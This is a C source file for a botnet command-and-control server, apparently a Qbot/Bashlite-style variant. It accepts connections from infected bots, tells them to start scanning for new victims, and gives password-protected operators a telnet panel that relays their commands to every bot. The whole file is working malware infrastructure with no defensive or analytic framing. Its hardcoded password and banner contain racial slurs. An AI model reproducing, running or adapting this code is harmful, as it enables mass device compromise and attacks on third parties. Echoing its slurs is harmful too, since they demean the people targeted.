//if you have this its because of the following richy,blj,lightspeed,serlo,seb
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

const char *colours[] = { "31", "32", "33", "34", "35", "36" };

#define MAXFDS 1000000 // Max bot count - no way we actually reach this amount, ever.
#define MY_MGM_PASS "nigger"

static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

struct clientdata_t
{
	uint32_t ip;
	char connected;
} clients[MAXFDS];

struct telnetdata_t
{
	int connected;
} managements[MAXFDS];

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
	int total = 0, got = 1;
	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
	{
		got = read(fd, buffer + total, 1);
		total++;
	}
	return got;
}

void trim(char *str) // Remove whitespace from a string and properly null-terminate it
{
	int i, begin = 0, end = strlen(str) - 1;
	while (isspace(str[begin])) begin++;
	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];
	str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
	int flags = fcntl(sfd, F_GETFL, 0), s;
	if (flags == -1)
	{
		perror("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	/*
	* F_SETFL(int)
	* Set the file status flags to the value specified by arg. File access mode (O_RDONLY, O_WRONLY, O_RDWR)
	* and file creation flags (i.e., O_CREAT, O_EXCL, O_NOCTTY, O_TRUNC) in arg are ignored. On Linux this
	* command can change only the O_APPEND, O_ASYNC, O_DIRECT, O_NOATIME, and O_NONBLOCK flags.
	*/
	s = fcntl(sfd, F_SETFL, flags);
	if (s == -1)
	{
		perror("fcntl");
		return -1;
	}
	return 0;
}

static int create_and_bind(char *port)
{
	struct addrinfo hints, *result, *rp;
	int s, sfd, yes = 1;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC; // Return IPv4 and IPv6 choices
	hints.ai_socktype = SOCK_STREAM; // We want a TCP socket
	hints.ai_flags = AI_PASSIVE; // All interfaces
	s = getaddrinfo(NULL, port, &hints, &result);
	if (s != 0)
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) break;
		close(sfd);
	}
	if (rp == NULL)
	{
		fprintf(stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo(result);
	return sfd;
}

char *timepls()
{
	time_t now;
	struct tm *gmt;
	char buffer[50];
	now = time(NULL);
	gmt = gmtime(&now);
	strftime(buffer, sizeof(buffer), "%A %d/%m/%Y - %I:%M%p (GMT)", gmt);
	return strdup(buffer);
}

void broadcast(char *msg, int us) // Sends message to all bots, notifies the management clients of this happening
{
	int i, sendMGM = 1;
	char prompt[20];
	sprintf(prompt, "\r\n\x1b[%sm-> \x1b[37m", colours[(rand() % 6)]);
	if (strcmp(msg, "PING") == 0) sendMGM = 0; // Don't send pings to management, why? Because a human is going to ignore it
	for (i = 0; i < MAXFDS; i++)
	{
		if (i == us || (!clients[i].connected && (sendMGM == 0 || !managements[i].connected))) continue;
		send(i, msg, strlen(msg), MSG_NOSIGNAL);
		if (sendMGM && managements[i].connected)
			send(i, prompt, strlen(prompt), MSG_NOSIGNAL); // Send a cool looking prompt to a manager/admin
		else
			send(i, "\n", 1, MSG_NOSIGNAL);
	}
}

void *epollEventLoop(void *useless) // The big loop used to control each bot asynchronously, many threads of this get spawned
{
	struct epoll_event event, *events;
	events = calloc(MAXFDS, sizeof(event));
	while (1)
	{
		int n, i, s;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;
					in_len = sizeof(in_addr);
					infd = accept(listenFD, &in_addr, &in_len); // Accept a connection from a bot
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}
					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // Check for duplicate clients by seeing if any have the same IP as the one connecting
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;
						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}
					if (dup)
					{
						// printf("Duplicate client detected\n"); // Warns the operator on command line
						if (send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1)
						{
							close(infd);
							continue;
						}
						if (send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1)
						{
							close(infd);
							continue;
						}
						close(infd);
						continue;
					}
					s = make_socket_non_blocking(infd);
					if (s == -1)
					{
						close(infd);
						break;
					}
					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}
					clients[infd].connected = 1;
					send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof(buf));
					while (memset(buf, 0, sizeof(buf)) && (count = fdgets(buf, sizeof(buf), thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL)
						{
							done = 1;
							break;
						}
						trim(buf);
						if (strcmp(buf, "PING") == 0) // Basic IRC-like ping/pong challenge to see if server is alive
						{
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1)
							{
								done = 1;
								break;
							}
							continue;
						}
						if (strcmp(buf, "PONG") == 0) continue;
						if (!strstr(buf, "cd /tmp")) printf("Buffer: %s\n", buf);
					}
					if (count == -1)
					{
						if (errno != EAGAIN) done = 1;
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}
				if (done)
				{
					client->connected = 0;
					close(thefd);
				}
			}
		}
	}
}

unsigned int clientsConnected() // Counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}
	return total;
}

void *titleWriter(void *sock) // Just an informational banner
{
	int thefd = (int)sock;
	char string[1000];
	while (1)
	{
		memset(string, 0, sizeof(string));
		sprintf(string, "%c]0;Bots Connected: %d | Hoes Connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
		if (send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
	}
}

void *telnetWorker(void *sock)
{
	int thefd = (int)sock;
	managesConnected++;
	pthread_t title;
	char buf[1024], prompt[15], loldongs1[85], loldongs2[85], password[20];
	memset(buf, 0, sizeof(buf));
	sprintf(password, "\x1b[%smPassword:\x1b[30m ", colours[(rand() % 6)]);
	if (send(thefd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end; // Failed to send, kill connection
	if (fdgets(buf, sizeof(buf), thefd) < 1) goto failed; // No data, kill connection
	trim(buf);
	if (strcmp(buf, MY_MGM_PASS) != 0) goto failed; // Bad pass, kill connection
	memset(buf, 0, sizeof(buf));
	pthread_create(&title, NULL, &titleWriter, sock); // Writes the informational banner to the admin after a login
	sprintf(loldongs1, "\r\n       \x1b[%smdb   d8b   db d88888b db       .o88b.  .d88b.  .88b  d88. d88888b\r\n", colours[(rand() % 6)]);
	sprintf(loldongs2, "       \x1b[%sm                   ~ [  niggah<3  ] ~   \r\n\r\n\x1b[%sm-> \x1b[37m", colours[(rand() % 6)], colours[(rand() % 6)]);
	if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, loldongs1, strlen(loldongs1), MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, "       88   I8I   88 88'     88      d8P  Y8 .8P  Y8. 88'YbdP`88 88'\r\n", 70, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, "       88   I8I   88 88ooooo 88      8P      88    88 88  88  88 88ooooo\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, "       Y8   I8I   88 88~~~~~ 88      8b      88    88 88  88  88 88~~~~~\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, "       `8b d8'8b d8' 88.     88booo. Y8b  d8 `8b  d8' 88  88  88 88.\r\n", 70, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, "        `8b8' `8d8'  Y88888P Y88888P  `Y88P'  `Y88P'  YP  YP  YP Y88888P\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, loldongs2, strlen(loldongs2), MSG_NOSIGNAL) == -1) goto end;
	managements[thefd].connected = 1;
	while (fdgets(buf, sizeof(buf), thefd) > 0)
	{
		trim(buf);
		memset(prompt, 0, sizeof(prompt));
		sprintf(prompt, "\x1b[%sm-> \x1b[37m", colours[(rand() % 6)]);
		if (send(thefd, prompt, strlen(prompt), MSG_NOSIGNAL) == -1) goto end;
		if (strlen(buf) == 0) continue;
		if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0)
		{
			sprintf(loldongs1, "\r\n       \x1b[%smdb   d8b   db d88888b db       .o88b.  .d88b.  .88b  d88. d88888b\r\n", colours[(rand() % 6)]);
			sprintf(loldongs2, "       \x1b[%sm                   ~ [  niggah<3  ] ~   \r\n\r\n\x1b[%sm-> \x1b[37m", colours[(rand() % 6)], colours[(rand() % 6)]);
			if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, loldongs1, strlen(loldongs1), MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, "       88   I8I   88 88'     88      d8P  Y8 .8P  Y8. 88'YbdP`88 88'\r\n", 70, MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, "       88   I8I   88 88ooooo 88      8P      88    88 88  88  88 88ooooo\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, "       Y8   I8I   88 88~~~~~ 88      8b      88    88 88  88  88 88~~~~~\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, "       `8b d8'8b d8' 88.     88booo. Y8b  d8 `8b  d8' 88  88  88 88.\r\n", 70, MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, "        `8b8' `8d8'  Y88888P Y88888P  `Y88P'  `Y88P'  YP  YP  YP Y88888P\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
			if (send(thefd, loldongs2, strlen(loldongs2), MSG_NOSIGNAL) == -1) goto end;
		}
		if (strncmp(buf, "BOTS", 4) == 0 || strncmp(buf, "bots", 4) == 0)
		{
			char string[1000];
			memset(string, 0, sizeof(string));
			sprintf(string, "[\x1b[32m+\x1b[37m] - Bot Count: [ \x1b[31m%d\x1b[37m ] | Users Logged In: [ \x1b[31m%d\x1b[37m ] - [\x1b[32m+\x1b[37m]\r\n\x1b[%sm-> \x1b[37m", clientsConnected(), managesConnected, colours[(rand() % 6)]);
			if (send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) goto end;
		}
		printf("Management: %s\n", buf);
		broadcast(buf, thefd); // Take a command and send it to the bots
		memset(buf, 0, sizeof(buf));
	}
failed:
	if (send(thefd, "\033[1A", 4, MSG_NOSIGNAL) == -1) goto end;
	if (send(thefd, "\x1b[31m*             LOGIN FAILED!             *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
	goto end;
end:
	// Clean-up dead socket
	managements[thefd].connected = 0;
	close(thefd);
	managesConnected--;
}

void *telnetListener(int port)
{
	int sockfd, newsockfd;
	socklen_t clilen;
	struct sockaddr_in serv_addr, cli_addr;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) perror("ERROR opening socket");
	bzero((char *)&serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(port);
	if (bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
	listen(sockfd, 5);
	clilen = sizeof(cli_addr);
	while (1)
	{
		newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
		if (newsockfd < 0) perror("ERROR on accept");
		pthread_t thread;
		pthread_create(&thread, NULL, &telnetWorker, (void *)newsockfd);
	}
}

int main(int argc, char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "[\x1b[31m-\x1b[37m] Usage: %s <bot port> <cnc port>\r\n[\x1b[33m?\x1b[37m] Example: %s 23 69\r\n", argv[0], argv[0]);
		exit(EXIT_FAILURE);
	}
	printf("[\x1b[32m+\x1b[37m] Server started on %s\r\n[\x1b[33m?\x1b[37m] Bot port: %d\r\n[\x1b[33m?\x1b[37m] Command and Control port: %d\r\n\r\n", timepls(), atoi(argv[1]), atoi(argv[2]));
	// if (fork()) exit(0);
	srand(time(NULL));
	signal(SIGPIPE, SIG_IGN); // Ignore broken pipe errors sent from kernel
	int s, threads = 1;
	struct epoll_event event;
	listenFD = create_and_bind(argv[1]);
	if (listenFD == -1) abort();
	s = make_socket_non_blocking(listenFD); // Try to make the socket nonblocking, die if we can't
	if (s == -1) abort();
	s = listen(listenFD, SOMAXCONN); // Listen with a huge backlog, die if we can't
	if (s == -1) abort();
	epollFD = epoll_create1(0); // Make an epoll listener, die if we can't
	if (epollFD == -1) abort();
	event.data.fd = listenFD;
	event.events = EPOLLIN | EPOLLET;
	s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
	if (s == -1) abort();
	pthread_t thread[threads + 2];
	while (threads--) pthread_create(&thread[threads + 1], NULL, &epollEventLoop, (void *)NULL); // Make a thread to command each bot individually
	pthread_create(&thread[0], NULL, &telnetListener, atoi(argv[2]));
	while (1)
	{
		broadcast("PING", -1); // Ping bots every 60 seconds on the main thread
		sleep(60);
	}
	close(listenFD);
	return EXIT_SUCCESS;
}
